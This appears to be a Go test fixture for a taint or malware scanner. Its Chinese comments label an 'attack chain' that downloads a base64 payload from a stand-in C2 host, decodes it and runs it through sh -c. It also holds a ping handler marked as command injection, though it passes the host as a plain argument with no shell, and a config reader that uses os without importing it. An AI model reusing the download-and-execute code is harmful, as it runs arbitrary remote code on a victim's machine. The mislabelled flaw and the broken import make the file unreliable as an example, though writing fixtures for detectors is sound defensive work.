package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os/exec"
)

// === 攻击链 1: Download & Execute ===
func fetchAndExecute() error {
	// Step 1: 从网络获取数据（Source）
	resp, err := http.Get("https://evil-c2.example.com/payload.b64")
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	encodedData, _ := io.ReadAll(resp.Body)

	// Step 2: base64 解码（Transform）
	decodedData, _ := base64.StdEncoding.DecodeString(string(encodedData))

	// Step 3: 动态执行（Sink）
	cmd := exec.Command("sh", "-c", string(decodedData))
	return cmd.Run()
}

// === 攻击链 2: Command Injection ===
func handlePing(host string) string {
	// Step 1: 用户输入（Source）— host 参数
	// Step 2: 直接拼接到命令（Sink）— 无净化
	cmd := exec.Command("ping", "-c", "1", host)
	out, _ := cmd.Output()
	return string(out)
}

// === 正常代码 ===
func readConfig() string {
	data, _ := os.ReadFile("config.yaml")
	return string(data)
}
